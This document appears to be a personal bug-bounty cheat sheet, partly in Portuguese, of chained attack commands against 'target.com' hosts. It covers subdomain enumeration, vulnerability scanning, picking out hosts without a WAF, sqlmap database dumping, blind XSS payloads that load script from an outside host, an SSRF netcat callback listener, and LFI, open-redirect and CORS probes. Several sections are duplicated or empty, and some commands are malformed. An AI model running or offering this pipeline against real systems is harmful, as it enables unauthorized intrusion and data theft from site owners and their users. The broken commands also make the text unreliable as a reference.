RECON Subdomain üåêÔ∏è
-----------------------------
subfinder -d target.com -all -recursive -o subfinder.txt
shodanx subdomain -d target.com -ra -o shodax.txt
amass enum -active -norecursive -noalts -d target.com -o amass.txt
gobuster dns -d cengage.co.in -w /usr/share/wordlists/subdomain_megalist.txt -o gobuster.txt

curl -s https://crt.sh/\?q\=\%.$1\&output\=json | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u | tee -a subs_domain.txt
curl -s "https://otx.alienvault.com/api/v1/indicators/hostname/domain.com/passive_dns" | jq -r '.passive_dns[]?.hostname' | grep -E "^[a-zA-Z0-9.-]+\.domain\.com$" | sort -u | tee alienvault_subs.txt
curl -s "https://urlscan.io/api/v1/search/?q=domain:domain.com&size=10000" | jq -r '.results[]?.page?.domain' | grep -E "^[a-zA-Z0-9.-]+\.domain\.com$" | sort -u | tee urlscan_subs.txt
curl -s "http://web.archive.org/cdx/search/cdx?url=*.domain.com/*&output=json&collapse=urlkey" | jq -r '.[1:][] | .[2]' | grep -Eo '([a-zA-Z0-9._-]+\.)?domain\.com' | sort -u | tee webarcive_subs.txt

cat *.txt | sort -u > all_subdomais.txt

Filtering live hosts with httpxüö®
---------------------------------
cat subs_domain.txt | httpx -td -title -sc -ip > httpx_domain.com.txt
cat httpx_domain.com.txt | awk '{print $1}' > live_subs_domain.com.txt
httpx -l all_subdomais.txt -ports 80,443,3306,5432,5900,6379,8000,8080,8081,8082,8083,8443,8888,9090,10000,15672,27017 -threads 2 -o alive.txt

Nmap:üõúÔ∏è
--------
sudo nmap -sV -iL live_subs_domain.com.txt -oN scaned-port.txt --script=vuln*

Subdomain Takeover:üì¶Ô∏è
-------------------
subzy run --targets subdomains.txt --concurrency 100 --hide_fails --verify_ssl

Finding WAF (web application firewall)üõ°Ô∏è
--------------------------------------
cat httpx_domain.com.txt | grep 403

Subdomains without WAF‚úÖ
------------------------
cat httpx_domain.com.txt | grep -v -i -E 'cloudfront|imperva|cloudflare' > nowaf_subs_domain.com.txt

Visit All Non-WAF Subdomains Manuallyüß±Ô∏è
-------------------------------------
cat nowaf_subs_domain.com.txt | grep 403 | awk '{print $1}'

Search links
--------------------------------------
katana -u www.target.com.br -v -d 3 -fx -aff -jc -kf -iqp -ef woff, css, png, svg, jpg, woff2, jpeg, gif, svg | tee > allurlspref.txt
katana -u www.target.com.br -v -d 5 -ef woff, css, png, svg, jpg, woff2, jpeg, gif, svg -o allurlspref.txt

cat alive.txt | gau --threads 100 > gau.txt
cat alive.txt | hakrawler -t 100 > hakrawler.txt --opcional

cat gau.txt | grep "=" | anew ou sort -u > parametros.txt
cat parametros.txt | sed 's/=.**/=/' | anew ou sort -u > parametros_limpo.txt (remove op conteudo apos o =)

Prepare the List of 403 Subdomains for Fuzzingüé≤Ô∏è
----------------------------------------------
cat nowaf_subs_domain.com.txt | grep 403 | awk '{print $1}' > 403_subs_domain.com.txt

Default Wordlist Fuzzing
dirsearch -u https://sub.domain.com -x 403,404,500,400,502,503,429 --random-agent

Extension based Fuzzing
dirsearch -u https://sub.domain.com -e xml,json,sql,db,log,yml,yaml,bak,txt,tar.gz,zip -x 403,404,500,400,502,503,429 --random-agent

CORSY
------------
python corsy.py -i /home/coffinxp/waitor/subdomains_alive.txt -t 10 --headers "User-Agent: GoogleBot\nCookie: SESSION=Hacked"

SSRF (without burp professional)
------------
<img src="http://end:porta">
nc -nlvp 31337

OR
------------
cat allurls.txt | gf redirect | openredirex -p /home/coffinxp/openRedirect/

LFI
------------
cat allurls.txt | gf lfi | nuclei -tags Lfi

XSS
-------------
https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide

>>example 1
katana -ps -f qurl | gf xss | bxss -appendMode -payload "<script src=https://xss.report/c/coffinxp></script>"

>>example 2
echo target.com | gau | gf xss | uro | Gxss | kxss | tee xss_output.txt
cat xss_output.txt | grep -oP '^URL: \K\S+' | sed 's/=.*/=/ | sort -u > final.txt
python loxs.py

>>example 3
send POST request to Store the XSS payload and verify it working of the payload with an GET request
dalfox sxss -X POST https://target.com/update_profile -d "login=admin" --trigger "https://target.com/my_profile" --request-method GET


SQLi
-------------
cat allurls.txt | gf sqli > sql.txt; sqlmap -m sql.txt --batch --dbs --risk 3 --level 5 --random-agent | tee -a sqli.txt

JavaScript analysis üîéÔ∏è
--------------------------
cat allurls.txt | grep -E "\.js$" >> js.txt
cat js.txt | nuclei -t /home/coffinxp/nuclei-templates/http/exposures/ -c 30

-------------------------------------------------------------------

>>Bug Bounty Mathdlogy by Muhammad Waseem

1. subfinder -d example.com -all -recursive > subdomain.txt

2. cat subdomain.txt | httpx-toolkit -ports 80, 443, 8080, 8000, 8888 -threads 200 > subdomains_alive.txt

3. katana -u subdomains_alive.txt -d 5 -ps -pss waybackarchive, commoncrawl, alienvault -hf -jc -fx -ef woff, css, png, svg, jpg, woff2, jpeg, gif, svg -o allurls.txt

4. cat allurls.txt | grep -E "\.js$" >> js.txt

5. cat js.txt | nuclei -t /home/coffinxp/nuclei-templates/http/exposures/ -c 30

6. cat allurls.txt | grep -E "\.txt/\.log/\.cache/\.secret|\.db/\.backup/\.yml/\.json/\.gz|\.rar|\.zip/\_config"

7. dirsearch -u https://example.com -e conf, config, bak, backup, smp, old, db, sql, asp, aspx, py, rb, php, bak, bhp, cache, cgi, conf, csv, html, inc, jar, js, json, jsp, lock, log, rar, old, sql, sql.gz, sql.zip, tar.gz, smp, tar, tar.bz2, tar.gz, txt, wadl, zip, log, xml, js, json

8. subfinder -d example.com | httpx-toolkit -silent | katana -ps -f qurl | gf xss | bxss -appendMode -payload "<script src=https://xss.report/c/coffinxp></script>"

9. subzy run --targets subdomains.txt --concurrency 100 --hide_fails --verify_sst

10. python corsy.py -i /home/coffinxp/waitor/subdomains_alive.txt -t 10 --headers "User-Agent: GoogleBot\nCookie: SESSION=Hacked"

11. nuclei -list subdomains_alive.txt -tags cves, osint, tech

12. cat allurls.txt | gf lfi | nuclei -tags Lfi

13. cat allurls.txt | gf redirect | openredirex -p /home/coffinxp/openRedirect/

14 
subfinder -d testphp.vulnweb.com -all -silent | cow | urldedupe |
gf sqli >sql.txt; sqlmap -m sql.txt --batch --dbs --risk 2 
--level 5 --random-agent | tee -a sqli.txt

-------------------------------------------------------------------


subfinder -d target -o saida.txt
cat saida.txt | httpx-toolkit -ports 80,443,8080,8443,8000,8888,8081,8082,8083,8181,3306,5432,6379,27017,15672,10000,9090,5900 -threads 200 > alive.txt 
cat alive.txt | gau --threads 100 > gau.txt
cat alive.txt | hakrawler -t 100 > hakrawler.txt --opcional

cat gau.txt | grep "=" | anew ou sort -u > parametros.txt
cat parametros.txt | sed 's/=.**/=/' | anew ou sort -u > parametros_limpo.txt (remove op conteudo apos o =)

tecnica para descobrir novos parametros que nao pegaram no GAU
ffuf -u "target/?FUZZ=123456" -mr "123456" -w "/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt" (meotod via GET)

ffuf -u "http://target/login" -X POST -d "username=admin&password=123456"

----------

RECON Subdomain üåêÔ∏è
-----------------------------
subfinder -d target.com -all -recursive -o subfinder.txt
shodanx subdomain -d target.com -ra -o shodax.txt
amass enum -active -norecursive -noalts -d target.com -o amass.txt
gobuster dns -d cengage.co.in -w /usr/share/wordlists/subdomain_megalist.txt -o gobuster.txt

curl -s https://crt.sh/\?q\=\%.$1\&output\=json | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u | tee -a subs_domain.txt
curl -s "https://otx.alienvault.com/api/v1/indicators/hostname/domain.com/passive_dns" | jq -r '.passive_dns[]?.hostname' | grep -E "^[a-zA-Z0-9.-]+\.domain\.com$" | sort -u | tee alienvault_subs.txt
curl -s "https://urlscan.io/api/v1/search/?q=domain:domain.com&size=10000" | jq -r '.results[]?.page?.domain' | grep -E "^[a-zA-Z0-9.-]+\.domain\.com$" | sort -u | tee urlscan_subs.txt
curl -s "http://web.archive.org/cdx/search/cdx?url=*.domain.com/*&output=json&collapse=urlkey" | jq -r '.[1:][] | .[2]' | grep -Eo '([a-zA-Z0-9._-]+\.)?domain\.com' | sort -u | tee webarcive_subs.txt

cat *.txt | sort -u > all_subdomais.txt

Filtering live hosts with httpxüö®
---------------------------------
cat subs_domain.txt | httpx -td -title -sc -ip > httpx_domain.com.txt
cat httpx_domain.com.txt | awk '{print $1}' > live_subs_domain.com.txt
httpx -l all_subdomais.txt -ports 80,443,3306,5432,5900,6379,8000,8080,8081,8082,8083,8443,8888,9090,10000,15672,27017 -threads 200 -o alive.txt

Nmap:üõúÔ∏è
--------
naabu --alive.txt -c 50 -nmap-cli 'nmap -sV -sC' -o naabuports.txt
sudo nmap -sV -iL live_subs_domain.com.txt -oN scaned-port.txt --script=vuln*

Nikto:ü¶†Ô∏è
--------
nikto -h alive_subdomains.txt -output nikto_results.txt

Subdomain Takeover:üì¶Ô∏è
-------------------
subzy run --targets subdomains.txt --concurrency 100 --hide_fails --verify_ssl

Broken Link Hijacking:üé°Ô∏è
----------------------
socialhunter -f alive_subdomains.txt

Screenshotting üì∏
-----------------
eyewitness --web -f alive_subdomains.txt --threads 5 -d screenshots

----------------------------------------------------------------------
Nuclei Automated Live Subdomains Spray (with rate limit)üî®
----------------------------------------------------------
nuclei -l live_subs_domain.com.txt -rl 10 -bs 2 -c 2 -as -silent -s critical,high,medium

Finding WAF (web application firewall)üõ°Ô∏è
--------------------------------------
cat httpx_domain.com.txt | grep 403

Subdomains without WAF‚úÖ
------------------------
cat httpx_domain.com.txt | grep -v -i -E 'cloudfront|imperva|cloudflare' > nowaf_subs_domain.com.txt

Visit All Non-WAF Subdomains Manuallyüß±Ô∏è
-------------------------------------
cat nowaf_subs_domain.com.txt | grep 403 | awk '{print $1}'

Prepare the List of 403 Subdomains for Fuzzingüé≤Ô∏è
----------------------------------------------
cat nowaf_subs_domain.com.txt | grep 403 | awk '{print $1}' > 403_subs_domain.com.txt

403 Fuzzingüîç
-------------
Default Wordlist Fuzzing
dirsearch -u https://sub.domain.com -x 403,404,500,400,502,503,429 --random-agent

Extension based Fuzzing
dirsearch -u https://sub.domain.com -e xml,json,sql,db,log,yml,yaml,bak,txt,tar.gz,zip -x 403,404,500,400,502,503,429 --random-agent


LFI
------------



XSS
-------------
https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide




SQLi
-------------


üß†Ô∏èNext step
JavaScript analysis üîéÔ∏è



Google Dorking üîÆ

GitHub Recon üíª

